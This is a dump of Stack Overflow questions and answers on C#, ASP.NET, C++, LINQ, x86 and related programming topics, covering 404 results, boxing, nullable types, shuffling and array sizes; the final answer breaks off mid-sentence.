<p>Recent I have added support for a ""Scrape-buster"" code on my site.  That is, I take a hash of a unique code attached to each image plus some salt, and pass the first few characters of that hash to the user, for confirmation during retrieval.  This allows me to prevent people from scraping every image off of the site.  (Without being logged in, and scraping the HTML as well, that is.)</p>

<p>Anyways, If the <code>ScrapeBuster</code> code is incorrect, I would like to return a 404 error from my controller.  Is there a built-in way to do this, or am I looking at building a custom <code>ActionResult</code>?</p>
","33708","","<p>The simplest (probably not the cleanest) way is to throw an <a href=""http://msdn.microsoft.com/en-us/library/system.web.httpexception.aspx""><code>HttpException</code></a>:</p>

<pre><code>public static void Throw404()
{
    throw new HttpException(404, ""The resource cannot be found"");
}
</code></pre>

<p>You should make sure no one in the call stack is catching the exception. This way, output will look like the normal ASP.NET Yellow Screen of Death 404. </p>

<p>The cleaner way is to return a custom result:</p>

<pre><code>public sealed class HttpNotFoundResult : ActionResult
{
    public override void ExecuteResult(ControllerContext context)
    {
        if (context == null)
            throw new ArgumentNullException(""context"");

        context.HttpContext.Response.StatusCode = 404;
    }
}
</code></pre>
"
"<p>I'm trying to use Tor-Server as a proxy in <code>HttpWebRequest</code>, my code looks like this:</p>

<pre><code>HttpWebRequest request;
HttpWebResponse response;

request = (HttpWebRequest)WebRequest.Create(""http://www.google.com"");
request.Proxy = new WebProxy(""127.0.0.1:9051"");

response = (HttpWebResponse)request.GetResponse();
response.Close();
</code></pre>

<p>it works perfect with ""normal"" proxies but with Tor I'm getting Exceptions while calling </p>

<p><code>GetResponse() with Status = ServerProtocolViolation. The message is (in German...):Message = ""Der Server hat eine Protokollverletzung ausgefÃ¼hrt.. Section=ResponseStatusLine""</code></p>

<p>hope anyone has an idea how to fix that. I would be grateful.</p>

<p>Greetings</p>

<p>L.</p>
","33708","","<p>Tor is <em>not</em> an HTTP proxy. It's a SOCKS proxy. You can use an HTTP proxy that supports forwarding on SOCKS (like Privoxy) and connect to that via code instead.</p>
"
"<p>How I can check in C++ if Windows version installed on computer is Windows Vista and higher (Windows 7)?</p>
","33708","","<p>Use <a href=""http://msdn.microsoft.com/en-us/library/ms724451%28VS.85%29.aspx"">GetVersionEx</a> API function defined in <code>kernel32.dll</code>:</p>

<pre><code>bool IsWindowsVistaOrHigher() {
   OSVERSIONINFO osvi;
   ZeroMemory(&amp;osvi, sizeof(OSVERSIONINFO));
   osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
   GetVersionEx(&amp;osvi);
   return osvi.dwMajorVersion &gt;= 6;
}
</code></pre>
"
"<p>In some projects, I have to deal with more than one programming language (for example a Delphi GUI application which communicates with an C# or Java app). The Subversion repository currently contains three top branches, one per language. </p>

<p>Should I change this and group all parts of the project in the trunk like in the following example to make branching and tagging on project level easier?</p>

<pre><code>project1
  branches
  ...
  tags
  ... 
  trunk
    csharp_app
    delphi_app
    java_app
    ...
project2
...
</code></pre>
","33708","","<p>Programming language is irrelevant when you're managing a single project. A single module may be written in a variety of programming languages but still be too tightly coupled to worth separating. If each module of the application (whether or not it's written in the same language) is independent enough to be considered a separate project (and consequently, become independently versioned), you may want to separate it. Otherwise, don't do that.</p>
"
"<p>The Java gurunaths (natha à¤¨à¤¾à¤¥ = sanskrit for deity-master-protector) at Sun should condescend to accept the necessity of delegates and draft it into Java spec.</p>

<p>In C#, I can pass a method as a handler referenced as a delegate, without needing to go thro the trouble of creating a class just because I need to pass a method in Java.</p>

<p>What are the reasons that make it unnecessary (besides citing the clunky use of a brand new class for the purpose) or disadvantageous that Sun decided not to have it in Java? What advantages does creating a class or implementing interfaces anonymously have over delegates? I can't think of any, can you?</p>
","33708","","<h3>Simplicity.</h3>

<p>By not introducing the concept of delegates into Java, they made the language simpler. Just like not having properties, indexers, ....</p>

<p>(using a simpler language is not necessarily simpler by the way; probably they should have added delegates but that's not how they made the design decisions)</p>
"
"<p>I have this LINQ-query:</p>

<pre><code>            bool? a, b, c;

            from i in _ctx.SomeEntitySet

            where
                (a == null ? true : i.IsA == a) &amp;&amp;
                (b == null ? true : i.IsB == b) &amp;&amp;
                (c == null ? true : i.IsC == c)

            select i;
</code></pre>

<p>I only want to take the condition <code>IsX == x</code> into consideration if <code>x != null</code>.</p>

<p>Brainfreeze, please help me out...</p>
","33708","","<pre><code>where (a == null || i.IsA == a) &amp;&amp;
      (b == null || i.IsB == b) &amp;&amp;
      (c == null || i.IsC == c)
</code></pre>
"
"<p>I have a controller that is all ajax calls, so I want to verify it's an ajax call once on the page before it calls the controller action so that if it's not an ajax call I can redirect to a home or error page. Is this possible?  I know I can put in the constructor class, but the request object is null at that point.</p>
","33708","","<p>You can use an <a href=""http://msdn.microsoft.com/en-us/library/dd410056.aspx"" rel=""nofollow""><code>ActionFilter</code></a>. It's designed to accomplish this task:</p>

<pre><code>public class MyActionFilterAttribute : ActionFilterAttribute {
   public override void OnActionExecuting(ActionExecutingContext context) {
      // will get executed when the decorated action runs
   }
}

// Action method:
[MyActionFilter]
public ActionResult Index(int id) {
   // ...
}
</code></pre>
"
"<p>In C#, any user-defined <code>struct</code> is automatically a subclass of <strike>System.Struct</strike> <code>System.ValueType</code> and <strike>System.Struct</strike> <code>System.ValueType</code> is a subclass of <code>System.Object</code>.</p>

<p>But when we assign some struct to object-type reference it gets boxed. For example:</p>

<pre><code>struct A
{
    public int i;
}

A a;
object obj = a;  // boxing takes place here
</code></pre>

<p>So my question is: if <code>A</code> is an descendant of <code>System.Object</code>, can't the compiler up-cast it to object type instead of boxing?</p>
","33708","","<p>A struct is a value type. <code>System.Object</code> is a reference type. Value types and reference types are stored and treated differently by the runtime. For a value type to be treated as a reference type, it's necessary for it to be boxed. From a low level perspective, this includes copying the value from the stack where it originally lives to the newly allocated memory on the heap, which also contains an object header. Additional headers are necessary for reference types to resolve their vtables to enable virtual method dispatches and other reference type related features (remember that a struct on stack is just a value and it has zero type information; it doesn't contain anything like vtables and can't be directly used to resolve dynamically dispatched methods). Besides, to treat something as a reference type, you have to have a <em>reference</em> (pointer) to it, not the raw value of it.</p>

<blockquote>
  <p>So my question is - if A is an descendant of System.Object, can't compiler upcast it to object type instead of boxing?</p>
</blockquote>

<p>At a lower level, a value does not inherit anything. Actually, as I said before, it's not really an object. The fact that A derives from <code>System.ValueType</code> which in turn derives from <code>System.Object</code> is something defined at the abstraction level of your programming language (C#) and C# is indeed hiding the boxing operation from you pretty well. You don't mention anything explicitly to box the value so you can simply think the compiler has ""upcasted"" the structure for you. It's making the <strong>illusion</strong> of inheritance and polymorphism for values while none of the tools required for polymorphic behavior is directly provided by them.</p>
"
"<p>As I've learned the static objects in classes are constructed when the class is being referenced for the first time. However I'd find it sometimes usefull to initialize the statics when the program is being started. Is there some method (ie by using annotations) of enforcing it?</p>
","33708","","<p>Simply reference a static field on that type at the beginning of your application. There's no way of doing this solely by altering the code at the class <em>definition site</em>.</p>
"
"<p>What's the quickest and easiest way to get the Min (or Max) value between two dates? Is there an equivalent to Math.Min (&amp; Math.Max) for dates?</p>

<p>I want to do something like:</p>

<pre><code> if (Math.Min(Date1, Date2) &lt; MINIMUM_ALLOWED_DATE) {
      //not allowed to do this
 }
</code></pre>

<p>Obviously the above Math.Min doesn't work because they're dates.</p>
","33708","","<p>There's no built in method to do that. You can use the expression:</p>

<pre><code>(date1 &gt; date2 ? date1 : date2)
</code></pre>

<p>to find the maximum of the two.</p>

<p>You can write a generic method to calculate <code>Min</code> or <code>Max</code> for any type (provided that <code>Comparer&lt;T&gt;.Default</code> is set appropriately):</p>

<pre><code>public static T Max&lt;T&gt;(T first, T second) {
    if (Comparer&lt;T&gt;.Default.Compare(first, second) &gt; 0)
        return first;
    return second;
}
</code></pre>

<p>You can use LINQ too:</p>

<pre><code>new[]{date1, date2, date3}.Max()
</code></pre>
"
"<p>I need to determine if any of the <code>List</code>s contained in the <code>Dictionary</code> contain the specified value. I'm new to LINQ, so is the following the correct way to achieve this?</p>

<pre><code>Dictionary lotsOfStuff = new Dictionary&lt;string, List&lt;string&gt;&gt;();
string searchString;

// populate lotsOfStuff and searchString...

// detemine if any of the values of lotsOfStuff contain searchString
bool existsInDictionary = lotsOfStuff.Values.Any(values =&gt; values.Contains(searchString));
</code></pre>

<p>And if the above will work, is there any way to make it more correct or more optimal/concise?</p>

<p>Thanks and Happy New Year! :)</p>
","33708","","<p>There's a potential problem with that code. If one of the lists is <code>null</code> (even if the value exists in another list), you'll possibly get a <code>NullReferenceException</code>. To fix, try:</p>

<pre><code>bool existsInDictionary = lotsOfStuff.Values
             .Any(values =&gt; values != null &amp;&amp; values.Contains(searchString));
</code></pre>
"
"<p>What is the best way to store/retrieve a DateTime value that is created by an application with a specific local date and time, stored in a database on a server that may be in a different time zone, then retrieved by other devices in a different time zone, where those devices need to interpret the DateTime value with the same local time as originally entered? For example, a user in the PST time zone creates an event that is supposed to occur on 1/1/10 at 8:00 AM; that event's date time is stored on a server; then a user in the EST time zone retrieves the DateTime and also interprets the event as occurring at 1/1/10 at 8:00 AM, NOT at 11:00 AM.</p>

<p>The current implementation creates a DateTime with the local time zone, but when the DateTime is uploaded to the server using Windows Services, the DateTime gets converted to the server's local time zone before it gets stored in the DB.</p>
","33708","","<p>Convert them to UTC and pass them around.  If you need the time zone of the originator too, you'll have to store that information too. You can use a <a href=""http://msdn.microsoft.com/en-us/library/system.datetimeoffset.aspx"" rel=""nofollow""><code>DateTimeOffset</code> structure</a> for that purpose in .NET and <a href=""http://msdn.microsoft.com/en-us/library/bb630289.aspx"" rel=""nofollow""><code>datetimeoffset</code> data type</a> in SQL Server.</p>
"
"<p>Ignore the reasons why someone would want to do this.... :)</p>

<p>I want to be able to take some bytes, covert them to a string, then later back to the <em>same</em> byte array. Same length and everything.</p>

<p>I've tried using the ASCIIEncoder class (works for only text files) and Unicode Encoder class (only works so far for arrays 1024*n big. I assume this is because of the equal length of each character) with no success.</p>

<p>Is there any easy way to do this? I assume I should probably write my own functions to do so huh?</p>
","33708","","<p>Use Base64 encoding. It's not space-efficient though.</p>

<pre><code>string s = Convert.ToBase64String(byteArray);
byte[] decoded = Convert.FromBase64String(s);
</code></pre>
"
"<p>Can I use <code>void*</code> instead of <code>LPVOID</code> in C?</p>

<p>Or <code>LPVOID</code> perform some special functionality than <code>void*</code>.</p>
","33708","","<p><code>LPVOID</code> is simply a Windows API <code>typedef</code> for <code>void*</code>. </p>
"
"<p>I have a WinForm application which is generating CSV files. I give the user the option of choosing the path in which to save these CSVs.</p>

<p>The user is using Windows 7 and is logged in as admin. When he tries to save the CSVs by way of the application, there is an error ""permission denied"".</p>

<p><strong>The application that is having the issue in particular is the console app. We are creating a scheduled task, and the task is specified to start the process as his administrator account. However will have issues when the application tries to save a file to the specified folder(to which his username has permission to write to).</strong></p>

<p>Is there a way to allow an administrator of the machine to create folders/files anywhere he has permission to via the application?</p>

<p>Thank you!</p>
","33708","","<p>You can either turn the UAC off or require the process to <a href=""http://stackoverflow.com/questions/573086/how-to-elevate-privileges-only-when-required"">run in an elevated context</a>.</p>

<p>In general, you should not worry about it unless your application is specially tailored for altering administrative stuff in the system, you should let the user decide to run it in elevated mode. </p>
"
"<p>Looking to shuffle four variables (trying to change the order they appear in on a multiple choice list).</p>

<p>I've been poking around for a while but I can't quite get my head around the logic, and looking up random shuffles in past questions gives super-detailed algorithms that are beyond my newbie skills (and the needs of this program I'm trying to write, I'd just like to make a multiple-choice image picker).</p>

<p>Ideally I'd like something that follows this pseudocode:</p>

<pre><code>// int Answer1 = Random(min1 max4)

// int Answer2 = Random(min1 max4)

// int Answer3 = Random(min1 max4)

// int Answer4 = Random(min1 max4)

// If Answer 1 equals ANY of the other three, re-randomize Answer1 and loop.

// Loop through this cycle for all answers.
</code></pre>

<p>I'd post my current regular code, but frankly, it's garbage. :(  This seems like a simple enough problem but I just can't get it right.</p>

<p>Thanks in advance!</p>
","33708","","<p>Well, technically, who cares if it's just 4 numbers of 400 numbers. You should be using <a href=""http://stackoverflow.com/questions/1971961/is-there-anything-wrong-with-this-shuffling-algorithm"">an implementation of Fisher-Yates shuffle</a>. However, to make it easier to understand:</p>

<pre><code>var possibleNumbers = new List&lt;int&gt;(Enumerable.Range(1, 4));
var result = new List&lt;int&gt;(4);
var rnd = new Random();
while (possibleNumbers.Count &gt; 0) {
    int r = rnd.Next(possibleNumbers.Count);
    result.Add(possibleNumbers[r]);
    possibleNumbers.RemoveAt(r);
}
</code></pre>

<p>The algorithm demonstrated above is basically Fisher-Yates shuffle. In practice, you don't use two distinct lists to hold stuff. You simply choose a random element from the part of the array you haven't fixed yet and move it to its place. The beginning of the single list will be fixed elements while the end will be the possibilities.</p>
"
"<p>Can I use interface method instead of delegate? How? I found searching that interface method is faster than using delegates. I would appreciate a simple code snippet.</p>
","33708","","<p>In theory, it's possible to accomplish everything done by delegates with interfaces (Java has no delegates, for instance) containing a single method. However, it makes the code more verbose and adds little benefit. Then again, it's possible to do everything without classes and possibly do it faster. That doesn't mean you should avoid using classes. Calling a delegate method might be <em>marginally</em> slower than calling an interface method. You shouldn't care about the micro-optimization. Use whatever fits your specific need.</p>
"
"<p>what  popViewControllerAnimated on the iphone SDK do ? </p>
","33708","","<p>It closes the current view and returns to the parent view (the one that pushed the current view) with respect to the animation used when pushing it. For instance, when you tap on a contact in the contacts application, a view controller is pushed and displays that specific contact. When you close the view, <code>popViewController</code> is called that dismisses the current view and returns you back to the contact list view.</p>
"
"<p>Check this code..</p>

<pre><code>    string str;

    if (str.Contains(""something..""))
    {
    }
</code></pre>

<p>Compiler throws this error for this code</p>

<p><strong>Use of unassigned local variable 'str'</strong></p>

<blockquote>
  <p><strong>Why does a reference type is not initialized to null ?</strong></p>
</blockquote>

<p>Just want to know out of curiosity.</p>

<p>I'd also want to know what happens for code below. how does this assignment work ?</p>

<pre><code>    string str = null;
</code></pre>
","33708","","<p>Only <strong>fields</strong> (variables declared at class level) are initialized automatically:</p>

<ul>
<li>Value types are initialized to their default value.</li>
<li>Reference types are initialized to <code>null</code> reference. </li>
</ul>

<p>What you are declaring is a ""local variable"" inside a method. Local variables are not automatically initialized regardless of being a value type or reference type. </p>

<blockquote>
  <p>I'd also want to know what happens for code below. how does this assignment work ?</p>
</blockquote>

<p>This assignment initializes the local variable with null value with an <code>ldnull</code> instruction followed by a <code>stloc</code> instruction (in case it's not optimized out, of course) and more importantly, satisfies the compiler's data flow analysis rules for definite assignment. C# specification defines a concept called definite assignment that ensures a variable is assigned before first use.</p>
"
"<p>The only difference I see is the fact that you can't use the ""using staticClass"" declaration. Therefore I'm wondering:</p>

<p>(1) Is there a real difference between a static class and a namespace?</p>

<p>(2) Is there a possibility to avoid having to rewrite the class name every time a member function is called? I'm thinking about something analogous to ""using staticClass"".</p>
","33708","","<p>Yes, a <code>static</code> class is technically a type. It can have members (fields, methods, events). A namespace can only hold types (and it's not considered a ""type"" by itself; <code>typeof(System)</code> is a compile-time error).</p>

<p>There's no direct equivalent to adding a <code>using</code> directive for a namespace for a static class. You can, however, declare aliases:</p>

<pre><code>using ShortName = ReallyReallyLongStaticClassName;
</code></pre>

<p>and use</p>

<pre><code>ShortName.Member
</code></pre>

<p>when referring its members.</p>

<p>Additionally, you can use static classes to declare extension methods on other types and use them directly without referring to the class name explicitly:</p>

<pre><code>public static class IntExtensions {
   public static int Square(this int i) { return i * i; }
}
</code></pre>

<p>and use it like:</p>

<pre><code>int i = 2;
int iSquared = i.Square(); // note that the class name is not mentioned here.
</code></pre>

<p>Of course, you'll have to add a <code>using</code> directive for the namespace containing the class to use the extension method if the class is not declared in the root or current namespace.</p>
"
"<p>I have a Vector class, and I was testing the following unit test (using nUnit).</p>

<pre><code>1  Vector test1 = new Vector(new double[] { 6, 3, 4, 5 });
2  Vector test2 = test1;
3  Assert.AreEqual(test1, test2, ""Reference test"");
4  test2 = new Vector(new double[] { 3, 3, 4, 5 });
5  Assert.AreEqual(test1, test2, ""Reference test"");
</code></pre>

<p>The first test in line 3 passes, but the second test in line 5 fails. Shouldn't test2 also point to the same memory as test1, since I did the assignment statement in line 2? My Vector is defined as a class, so it is a reference type. On the other hand, the following tests pass:</p>

<pre><code>1  Vector test1 = new Vector(new double[] { 6, 3, 4, 5 });
2  Vector test2 = test1;
3  Assert.AreEqual(test1, test2, ""Reference test"");
4  test2[1] = 4;
5  Assert.AreEqual(test1, test2, ""Reference test"");
</code></pre>

<p>Does that mean that, when I use the new operator to define a new object, old assignments are no longer valid? Any other (or correct - if I am wrong) explanation?</p>
","33708","","<p>The line</p>

<pre><code>test2 = new Vector(new double[] { 3, 3, 4, 5 });
</code></pre>

<p>creates a new instance of <code>Vector</code> on the heap and assigns its address to the <code>test2</code> variable. <code>test2</code> will point to a new, completely distinct object after that.</p>

<p>In contrast, the line</p>

<pre><code>test2[1] = 4;
</code></pre>

<p>does not change the <code>test2</code> variable itself (which is a reference to some object on the heap). Rather, it's changing the object it points to. <code>test2</code> still refers to the same location on the heap.</p>

<p>To summarize, in the former, you are changing the <em>reference</em> while in the latter, you are altering the <em>referent</em>. </p>
"
"<p>I have an ArrayList, and I need to be able to click a button and then randomly pick out a string from that list and display it in a messagebox.</p>

<p>How would I go about doing this?</p>
","33708","","<ol>
<li><p>Create an instance of <code>Random</code> class somewhere. Note that it's pretty important not to create a new instance each time you need a random number. You should reuse the old instance to achieve uniformity in the generated numbers. You can have a <code>static</code> field somewhere (be careful about thread safety issues):</p>

<pre><code>static Random rnd = new Random();
</code></pre></li>
<li><p>Ask the <code>Random</code> instance to give you a random number with the maximum of the number of items in the <code>ArrayList</code>:</p>

<pre><code>int r = rnd.Next(list.Count);
</code></pre></li>
<li><p>Display the string:</p>

<pre><code>MessageBox.Show((string)list[r]);
</code></pre></li>
</ol>
"
"<p>In programming languages concept,</p>

<p>Sebesta's book states that (Ninth ed., 284):</p>

<p><em>The disadvantage of fixed heap-dynamic arrays is that they take longer time to allocate array from stack.</em> </p>

<p>How can we analyze this statement? What is the difference between fixed heap-dynamic and heap-dynamic arrays. What does that fixed word stand for?</p>
","33708","","<p>Allocating memory off the stack is very simple. You just need to adjust the stack pointer. On x64, it's a single instruction:</p>

<pre><code>sub rsp, size
</code></pre>

<p>Heap allocation requires some memory management mechanism to look for a block large enough to hold the array, choose a block, mark it as allocated somewhere, and possibly asking the OS to allocate more memory pages by growing the address space of your process. It's much more complicated than stack-based allocation. </p>

<p>Re ""fixed"", since I don't have the book, I don't know the context it's using that word. Probably it means the array will not move in the heap after allocation.</p>
"
"<p>I have a web server which will read large binary files (several megs) into byte arrays. The server could be reading several files at the same time (different page requests) so I am looking for the most optimized way for doing this without taxing the CPU too much. Is the code below good enough?</p>

<pre><code>public byte[] FileToByteArray(string fileName)
{
    byte[] buff = null;
    FileStream fs = new FileStream(fileName, 
                                   FileMode.Open, 
                                   FileAccess.Read);
    BinaryReader br = new BinaryReader(fs);
    long numBytes = new FileInfo(fileName).Length;
    buff = br.ReadBytes((int) numBytes);
    return buff;
}
</code></pre>
","33708","","<p>Simply replace the whole thing with:</p>

<pre><code>return File.ReadAllBytes(fileName);
</code></pre>

<p>However, if you are concerned about the memory consumption, you should <em>not</em> read the whole file into memory all at once at all. You should do that in chunks. </p>
"
"<p>I must honestly say that I do not really understand much about casting, but I thought this would work.</p>

<p>I have a Generic Class Test:</p>

<pre><code>public class Test&lt;T,U&gt;
{
     T variable1;
     U variable2;

     //etc.
}
</code></pre>

<p>I need to use this class in a WPF view, and since you can't create generic views in WPF (how lovely) I thought: lets just use a <code>Test&lt;object, object</code>> for the view, since I am only concerned about working with the string representations of the variables in the view.</p>

<p>So I try:</p>

<pre><code>  Test&lt;Foo, Bar&gt; test = new Test&lt;Foo, Bar&gt;();
  return test as Test&lt;object, object&gt;;
</code></pre>

<p>But that gives me:</p>

<pre><code>  Error 1   Cannot convert type 'DomainModel.Tests.Test&lt;T,U&gt;' 
  to 'DomainModel.Tests.Test&lt;object,object&gt;' via a reference conversion, boxing
  conversion, unboxing conversion, wrapping conversion, or null type conversion
</code></pre>

<p>I would think that every object must be castable to object? </p>

<p>Anyhow, I am quite stuck now in how to ever use generic classes in WPF...</p>

<p>Any pointer in the right direction?</p>
","33708","","<p>C# up to version 3.0 does not support generic co/contra-variance. That is, something like <code>IEnumerable&lt;string&gt;</code> is not compatible with <code>IEnumerable&lt;object&gt;</code>.</p>

<p>C# 4 introduces statically checked definition site safe generic co/contra-variance but it's not going to help you either. It requires the generic parameter to be used only in input or output positions, but not both. That is, <code>List&lt;string&gt;</code> is not going to be compatible with <code>List&lt;object&gt;</code> in C# 4.0, but <code>IEnumerable&lt;string&gt;</code> can be used as an <code>IEnumerable&lt;object&gt;</code> since the type parameter for <code>IEnumerable</code> is only used as the return value (an output position) of the <code>Current</code> property.</p>
"
"<p>Have you ever tried to use the <code>Convert.ChangeType()</code> method to convert a value to a <code>Nullable&lt;T&gt;</code> type? Awkwardly, it will throw an <code>InvalidCastException</code> saying ""Null object cannot be converted to a value type"".</p>

<p>Try running this on your immediate window: <code>?System.Convert.ChangeType(null, typeof(int?))</code></p>

<p>For some obscure reason, Nullables are considered value types. For example, <code>typeof(int?).IsValueType</code> returns <code>true</code>.</p>

<p>For me, since <code>Nullable&lt;T&gt;</code> accept <code>null</code>, it's a class type, not a value type. Does anyone know why it would implemented differently?</p>
","33708","","<p><code>System.Nullable&lt;T&gt;</code> is technically a structure, so it's a value type (the <code>null</code> value for a <code>Nullable&lt;T&gt;</code> is not exactly the same thing as a null reference. It's a boolean flag that denotes the lack of a value.)  However, it's treated specially by the runtime and this makes it an awkward value type. First, it doesn't satisfy <code>where T : struct</code> type constraint (it doesn't satisfy <code>where T : class</code> either, for what it's worth). Second, it exhibits an interesting boxing behavior. Boxing a <code>Nullable&lt;T&gt;</code> will result in:</p>

<ul>
<li>A <code>null</code> reference, if the value is <code>null</code>.</li>
<li><p>A boxed value of the <em>underlying type</em> if it actually contains a value. That is, in the statements:</p>

<pre><code>int? x = 2;
object y = x;
</code></pre>

<p><code>y</code> is not a boxed <code>Nullable&lt;int&gt;</code>. It's simply a boxed <code>int</code>. You can unbox any boxed value of type <code>T</code> to <code>Nullable&lt;T&gt;</code> (and <code>T</code>, of course). Casting a <code>null</code> reference to <code>Nullable&lt;T&gt;</code> results in a <code>null</code> value (as you might expect).</p></li>
</ul>

<p>This special treatment by the runtime makes nullable types work more similar to the way <code>null</code> works in reference types.</p>
"
"<p>I am a DB programming noob. I need to populate a DB from textbox fields but when I try to then commit it to the DB, I go and view the database and all I see is Nulls... nothing is being saved... please help..</p>

<p>thanks</p>

<pre><code>private void btnSubmit_Click(object sender, EventArgs e)
    {
        TradesDataSet.TradesRow newTradesRow = tradesDataSet.Trades.NewTradesRow();

        newTradesRow.ID = textBoxTradeID.Text; 
        newTradesRow.EntryPrice = textBoxEntryPrice.Text;
        newTradesRow.ExitPrice = textBoxExitPrice.Text;            

        tradesDataSet.Trades.Rows.Add(newTradesRow);
        tradesDataSet.Trades.AcceptChanges();

        try
        {

            this.Validate();
            this.tradesBindingSource.EndEdit();
            this.tradesTableAdapter.Update(this.tradesDataSet.Trades);                
            MessageBox.Show(""Update successful"");
        }
        catch (System.Exception ex)
        {
            MessageBox.Show(""Update failed"");
        }
    }        
</code></pre>
","33708","","<p>Remove the <code>AcceptChanges</code> call. Data adapter's <code>Update</code> method looks at the changes in the database and uses the change list to update the actual database. It automatically accepts the changes in the <code>DataSet</code> after the update. If you call <code>AcceptChanges</code> on the <code>DataSet</code> manually before updating, the <code>DataAdapter</code> will think nothing is changed and doesn't do anything.</p>
"
"<p>Sure it's a regular expression's newbie question, I saw it in a program but I can't understand the part of the two backslashes, Does ""\\"" have a special meaning like \r or \t?</p>

<pre><code>[a-zA-Z]+\\.?
</code></pre>

<p>Thank you</p>
","33708","","<p>Yes, <code>\</code> is the escape character in Regex. <code>\\</code> means <code>\</code> and <code>\.</code> means a single dot while a single dot means any character. If you see that inside a string in a language like C, the double slashes will be picked up by the language compiler and the string will be really <code>\.</code> which will be parsed by the regex engine as a single dot.</p>
"
"<p><br>
I am just curious what exactly is simple evenhandler good for.
I can have:</p>

<pre><code>event EventHandler blah;
</code></pre>

<p>or</p>

<pre><code>delegate void Blah();
event Blah Blah1;
</code></pre>

<p>Is there some advantage of using EventHandlers except sparing an extra line of code? Thanks.</p>
","33708","","<p>An <code>EventHandler</code> is a <code>delegate</code> with a couple extra parameters. The first one is the sender, that is, the object that caused that event and the second is extra event data. It's simply a consistent pattern useful for declaring events. Without passing the sender as an argument, you cannot easily detect which object caused it and this might result in unnecessarily duplicated (copy-and-pasted) code. If you follow the standard event pattern, your event handler can carry on different tasks based on a property of the object that caused the event.</p>

<p>Besides, some events carry extra information along them, for example an event typed <code>MouseEventHandler</code> will pass the location of the mouse pointer in its second argument (<code>MouseEventArgs</code>) for your event handler to consume. The good thing about this pattern is that you can ignore the auxiliary data if your event handler is general and doesn't need it. You are able to hook up a method with <code>EventHandler</code> signature to a <code>MouseEventHandler</code> event, for example (since the type of the second argument inherits from <code>EventArgs</code>).</p>
"
"<p>I've got a whitelist of URLs I'm using, inside a <code>HashSet&lt;string&gt;</code>. I'm trying to find if the <code>url</code> starts with any of the items in the white list (it has to be that way round).</p>

<p><em>Edit:</em> The previous example was a bit misleading and had a typo - I already have a base url like yahoo.com, the whitelist is just the path.</p>

<pre><code>HashSet&lt;string&gt; whiteList = new HashSet&lt;string&gt;();

string path = ""/sport/baseball/"";
bool validUrl = false;

foreach (string item in whiteList)
{
    if (path.StartsWith(item))
    {
        validUrl = true;
        break;
    }
}
</code></pre>

<p>Is there a more elegant way of doing this lookup with LINQ (to objects)? The list isn't huge so performance isn't an issue.</p>
","33708","","<pre><code>bool validUrl = whiteList.Any(item =&gt; linkUrl.StartsWith(item));
</code></pre>

<p>By the way, in general, hash tables are not good data structures for these kind of problems (where you don't have the key and are matching the key based on a function) as you'll have to enumerate the whole table all the time. You can use a simple <code>List&lt;string&gt;</code> to hold the items instead and you'll get better performance.</p>
"
"<p>How to find size of an int array?   eg: </p>

<pre><code>int list[]={1,5,7,8,1,1,4,5,7,7,7,8,10,20};
</code></pre>

<p>how to the size of list?</p>

<p>I know for char array. We can use <code>strlen(array)</code> to find the size, or check with <code>'\0'</code> at the end of the array. </p>

<p>But for int array, checking <code>'\0'</code> seems not working. </p>

<p>Problem!!!!!!!!!!  <code>sizeof(array)/sizeof(array[0])</code> only works in main???  If i use it inside a function. eg:</p>

<pre><code>  #include &lt;iostream&gt;

  using namespace std;
  void size(int arr1[]){
    int size;
    size=sizeof(arr1)/sizeof(arr1[0]);
    cout&lt;&lt;size&lt;&lt;endl;
  }

  int main(){
  int list_1[]={1,5,7,8,1,1,4,5,7,7,7,8,10,20};
  size(list_1);

  return 0;
}
</code></pre>

<p>It can not print the right size??</p>
","33708","","<p>You <em>can't</em> do that for a dynamically allocated array (or a pointer). For static arrays, you can use <code>sizeof(array)</code> to get the whole array size in bytes and divide it by the size of each element:</p>

<pre><code>#define COUNTOF(x) (sizeof(x)/sizeof(*x))
</code></pre>

<p>To get the size of a dynamic array, you have to keep track of it manually and pass it around with it, or terminate it with a sentinel value (like '\0' in null terminated strings).</p>

<p><strong>Update:</strong> I realized that your question is tagged C++ and not C. You should definitely consider using <code>std::vector</code> instead of arrays in C++ if you want to pass things around:</p>

<pre><code>std::vector&lt;int&gt; v;
v.push_back(1);
v.push_back(2);
std::cout &lt;&lt; v.size() &lt;&lt; std::endl; // prints 2
</code></pre>
"
"<p>I have a device (digital indicator) that I am communicating with using the SerialPort class. The device documentation states that I need to have a 250 millisecond delay between writes. Is there a way to enforce this without putting extra delay into the system? I know this probably sounds like I'm worrying too much about something that's really small, but there are three of these indicators and it is reading them quite often, but not all the time. Basically, is there a good way to enforce that you don't send again in less than 250 milliseconds, but if it's been 5 seconds and I try to send, I don't want to delay an additional 250 milliseconds for no reason.</p>

<p>Thoughts?</p>
","33708","","<p>Suspending the thread should work for you:</p>

<pre><code>System.Threading.Thread.Sleep(250);
</code></pre>

<p>However, this can be a little inaccurate since you can't guarantee the next time your thread is going to be scheduled. If you need precise timings, you'd better use spin waits.</p>
"
"<p>I've read that making a class <code>sealed</code> in C# is advisable in high-performance scenarios because it frees the compiler to make certain optimizations (e.g., inlining property getters) that it wouldn't be able to make otherwise. Is the same true for <code>NotInheritable</code> in VB.NET? My guess would be yes, but I'm posting this question in case someone else has already investigated and happens to know the answer.</p>
","33708","","<p>Yes, the generated IL for <code>sealed</code> in C# is identical to <code>NotInheritable</code> in VB.NET and those potential optimizations will be done by the JIT compiler which will happen regardless of the original language.</p>
"
"<p>I'm just touching the surface of the x86 instruction set after a long period of high level programming. It's been about 20 years I had my first read on x86 assembly programming and from my googlings I get just lost with the myriad of instruction set references; from ones that mix new generations of processors (286, 386, 486...) to others that add newer x86 instructions. Not to mention the AMD variations.</p>

<p>Since I'm planning on building a boot loader, my first thought was to be fully compliant with 'standard x86' but I can't figure out where in time it is or even if it exists anywhere.</p>

<p>Even Intel documentation seems follow the same path and like another one said, 'we need a x86 instruction set standardisation, the evolution of opcodes is chaotic'.</p>

<p>It's not my idea to hold the standardization banner. I just want to see the road and understand where is the safe place to walk. If anyone could help I'd appreciate a lot!</p>
","33708","","<p>Historically, x86 has been very backward compatible. x86-64 has thrown away some very old instructions (like BCD instructions) but it's unlikely that these kind of changes are going to happen again (at least not until something huge as 64 bit address space transition happens).</p>

<p>If you want to ensure your code works on virtually all x86 processors out there, stick to the 386 instruction set (if your code is 32-bit) or early x86-64 instruction set (if it's 64-bit).</p>
"
"<p>How do you use the Array.GetLength function in C#?</p>

<p>What is the difference between the Length property and the GetLength function?</p>
","33708","","<p><code>GetLength</code> takes an integer that specifies the dimension of the array that you're querying and returns its length. <code>Length</code> property returns the total number of items in an array:</p>

